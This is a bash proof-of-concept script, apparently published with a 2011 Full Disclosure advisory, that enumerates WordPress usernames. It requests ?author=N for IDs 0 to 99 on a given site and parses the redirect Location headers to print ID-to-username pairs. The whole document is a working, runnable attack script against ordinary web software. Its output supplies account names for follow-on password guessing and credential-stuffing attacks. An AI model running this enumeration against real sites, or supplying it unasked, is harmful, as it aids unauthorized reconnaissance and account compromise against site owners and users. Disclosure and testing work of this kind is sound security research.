#!/bin/bash
# WordPress User Enumeration PoC by Anant Shrivastava
# Disclosure : http://seclists.org/fulldisclosure/2011/May/493
# License : GPLv2
# License URL : http://www.gnu.org/licenses/gpl-2.0.html
if [ $# -ne 1 ]
then
    echo "Wordpress username enumeration PoC"
    echo "based on disclosure @ : http://seclists.org/fulldisclosure/2011/May/493 "
    echo $0 "URL of Website"
else
    count=0
    title=0
    while [ $count -lt 100 ]
    do
        result=`curl -I -s --max-time 30 --max-filesize 1 $1?author=$count | grep -F 'Location:'`
        name=`echo $result |  rev | cut -f2 -d"/" | rev`
        nm=`echo "$"$result`
        if [ "$nm" != "$" ]
        then
            if [ $title == 0 ]
            then
                echo "ID : UserName"
                title=1
            fi
            echo -n $count " : "
            echo $name
        fi
        count=`expr $count + 1`
    done
    if [ $title == 0 ]
    then
        echo "Either this site is not vulnerable or is not using wordpress hosted"
    fi
fi
